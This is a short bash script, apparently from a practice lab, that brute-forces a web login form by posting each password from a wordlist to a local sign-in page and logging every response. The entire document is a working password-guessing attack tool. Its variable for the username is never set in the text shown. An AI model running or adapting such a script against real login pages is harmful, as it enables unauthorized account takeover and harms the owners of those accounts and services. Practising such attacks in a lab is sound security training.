#!/bin/bash

URL="http://127.0.0.1:8080/index.php?page=signin"

PASSWORD_LIST="passwords.txt"

LOG_FILE="login_attempts.log"


while read -r PASSWORD; do
    echo "Trying password: $PASSWORD"
	RESPONSE=$(curl -s -X POST -d "username=$USERNAME&password=$PASSWORD" "$URL")
	echo "Password: $PASSWORD" >> "$LOG_FILE"
    echo "Response:" >> "$LOG_FILE"
    echo "$RESPONSE" >> "$LOG_FILE"
    echo "----------------------------------------" >> "$LOG_FILE"
done < "$PASSWORD_LIST"